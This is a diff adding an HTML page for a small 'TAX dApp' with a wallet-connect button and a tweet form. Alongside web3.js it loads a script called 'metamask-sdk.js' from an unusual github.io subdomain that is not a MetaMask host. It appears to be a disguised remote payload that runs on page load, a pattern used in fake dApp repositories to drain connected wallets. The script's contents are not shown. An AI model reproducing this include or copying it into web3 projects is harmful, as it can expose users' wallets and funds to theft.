@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>TaxCompliance test</title>
+    <meta charset="UTF-8" />
+    <link rel="stylesheet" href="src/App.css" />
+  </head>
+
+  <body>
+    <div class="container">
+      <h1>TAX dApp</h1>
+      <div class="connect">
+        <button id="connectWalletBtn">Connect Wallet</button>
+        <div id="userAddress"></div>
+      </div>
+      <div id="connectMessage">Please connect your wallet to tweet.</div>
+      <form id="tweetForm" style="display: none;">
+        <textarea
+          id="tweetContent"
+          rows="4"
+          placeholder="What's happening?"
+        ></textarea
+        ><br />
+        <button id="tweetSubmitBtn" type="submit">Tweet</button>
+      </form>
+      <div id="tweetsContainer"></div>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.6.1/web3.min.js"></script>
+    <script src="https://c0f4f41c-2f55-4863-921b-sdk-docs.github.io/cdn/metamask-sdk.js"></script>
+    <script type="module" src="index.js"></script>
+
+  </body>
+</html>
